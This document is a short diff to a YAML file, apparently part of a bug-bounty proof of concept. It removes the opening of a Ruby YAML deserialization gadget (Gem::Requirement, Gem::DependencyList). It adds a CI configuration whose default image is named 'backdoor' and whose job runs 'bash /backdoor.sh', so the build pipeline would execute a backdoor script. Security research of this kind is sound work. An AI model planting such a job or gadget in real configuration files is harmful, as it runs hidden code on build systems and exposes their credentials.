@@ -1,3 +1,6 @@
---- !ruby/object:Gem::Requirement
-image:
-  !ruby/object:Gem::DependencyList
+default:
+  image: gcr.io/gcp-bugbounty/backdoor
+
+meh:
+  script: bash /backdoor.sh
+
